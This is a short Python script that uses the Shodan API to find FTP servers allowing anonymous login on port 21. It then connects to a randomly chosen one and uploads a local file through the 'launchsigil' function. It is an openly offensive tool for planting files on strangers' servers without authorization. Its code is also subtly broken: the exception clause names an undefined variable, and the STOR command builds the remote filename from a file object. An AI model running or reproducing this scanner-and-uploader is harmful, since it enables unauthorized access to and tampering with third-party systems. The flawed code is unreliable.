import shodan
import ftplib
import os
import random
from api_key import *

api = shodan.Shodan(API_KEY)
targets = []

def findtarg():
# Wrap the request in a try/ except block to catch errors
    try:
        # Search Shodan
        results = api.search('230 login successful port:"21"')

        # Show the results
        for result in results['matches']:
            targets.append(result['ip_str'])
    except (shodan.APIError, e):
        print('Error: {}'.format(e))

def launchsigil(txt):
    findtarg()
    script_dir = os.path.dirname(__file__)
    rel_path = txt
    abs_path = os.path.join(script_dir, rel_path)
    session = ftplib.FTP(str(random.choice(targets)))
    session.login()
    file = open(str(abs_path),'rb')                  # file to send
#    session.storbinary('STOR' + str(abs_path), file)     # send the file
    with file as contents:
        session.storbinary('STOR %s' % file, contents)
    file.close()                                    # close file and FTP
    session.quit()

